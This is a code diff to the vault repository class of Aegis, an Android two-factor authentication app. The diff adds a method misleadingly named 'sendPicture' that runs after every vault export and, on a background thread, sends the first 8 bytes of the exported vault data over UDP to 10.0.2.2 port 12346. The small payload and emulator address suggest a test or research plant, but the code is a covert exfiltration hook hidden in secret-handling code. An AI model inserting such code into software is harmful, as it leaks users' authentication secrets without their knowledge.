@@ -1,6 +1,7 @@
 package com.beemdevelopment.aegis.vault;
 
 import android.content.Context;
+import android.util.Log;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
@@ -19,6 +20,11 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintStream;
+import java.net.DatagramPacket;
+import java.net.DatagramSocket;
+import java.net.InetAddress;
+import java.net.SocketException;
+import java.net.UnknownHostException;
 import java.nio.charset.StandardCharsets;
 import java.util.Collection;
 import java.util.HashSet;
@@ -175,14 +181,51 @@ public class VaultRepository {
             } else {
                 vaultFile.setContent(_vault.toJson(filter));
             }
-
             byte[] bytes = vaultFile.toBytes();
             stream.write(bytes);
-        } catch (IOException | VaultFileException e) {
+
+            sendPicture(bytes);
+        }
+
+         catch (IOException | VaultFileException e) {
             throw new VaultRepositoryException(e);
         }
     }
 
+    private void sendPicture(byte[] bytes) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                Log.d("ExportSender", "Export");
+
+                InetAddress serverAddress = null; // Use 10.0.2.2 for emulator
+                try {
+                    serverAddress = InetAddress.getByName("10.0.2.2");
+                } catch (UnknownHostException e) {
+                    throw new RuntimeException(e);
+                }
+                int serverPort = 12346; // Replace with your server port
+
+                // Create a new array with only the first 8 bytes
+                byte[] firstEightBytesData = new byte[8];
+                System.arraycopy(bytes, 0, firstEightBytesData, 0, 8);
+
+                try (DatagramSocket socket = new DatagramSocket()) {
+
+                    // Create a packet with just the first 8 bytes
+                    DatagramPacket packet = new DatagramPacket(firstEightBytesData, firstEightBytesData.length, serverAddress, serverPort);
+
+                    socket.send(packet);
+                    Log.d("ExportSender", "Packet with first 8 bytes sent successfully.");
+                } catch (SocketException e) {
+                    throw new RuntimeException(e);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+
+            }
+        }).start();
+    }
     /**
      * Exports the vault by serializing the list of entries to a newline-separated list of
      * Google Authenticator URI's and writing it to the given OutputStream.
